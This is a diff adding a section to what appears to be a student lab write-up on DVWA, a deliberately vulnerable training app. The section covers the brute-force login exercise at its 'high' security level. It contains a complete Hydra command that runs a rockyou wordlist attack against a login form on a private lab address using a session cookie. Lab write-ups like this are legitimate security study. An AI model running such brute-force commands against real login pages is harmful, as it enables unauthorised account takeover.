@@ -36,6 +36,22 @@ Higher security adds delays and protection mechanisms against automated login at
 
 ---
 
+### HIGH
+**Payload Used:**  
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 192.168.44.172 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=534uuj0t5702leo6gmot7b5c76;security=high:F=Username and/or password incorrect."`
+
+**Result:**  
+Correct password discovered through brute force.  
+![login3](cybersechw2imgs/login3.png)
+
+**Why it worked:**  
+With only one thread running, the random delay did not stop us from telling the difference between correct and incorrect passwords.
+
+**Why it failed at higher level:**  
+It still worked because the delay was not strong enough to fully stop the attack.
+
+---
+
 ## Command Injection
 
 ### LOW
